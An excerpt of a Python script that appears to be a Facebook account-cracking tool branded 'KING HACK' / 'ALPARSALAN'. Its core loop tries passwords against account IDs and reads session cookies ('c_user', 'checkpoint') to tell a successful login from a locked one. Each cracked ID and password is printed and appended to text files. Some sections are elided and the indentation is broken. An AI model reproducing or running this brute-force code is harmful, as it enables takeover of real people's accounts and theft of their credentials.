...
logo=("""
    ____  __.___ _______    ________    ___ ___    _____  _________  ____  __.
|    |/ _|   |\      \  /  _____/   /   |   \  /  _  \ \_   ___ \|    |/ _|
|      < |   |/   |   \/   \  ___  /    ~    \/  /_\  \/    \  \/|      <  
|    |  \|   /    |    \    \_\  \ \    Y    /    |    \     \___|    |  \ 
|____|__ \___\____|__  /\______  /  \___|_  /\____|__  /\______  /____|__ \
        \/           \/        \/         \/         \/        \/        \/
\33[1;37m----------------------------------------------
...
def riaz():
	...
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100088392859656');riaz()
	if riaz1 =='2':
		bangla()
	else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ALPARSALAN-OK] '+cid+'|'+ps+'\033[0;97m')
                open('ALPARSALAN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ALPARSALAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('ALPARSALAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mKING.ALPARSALAN\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
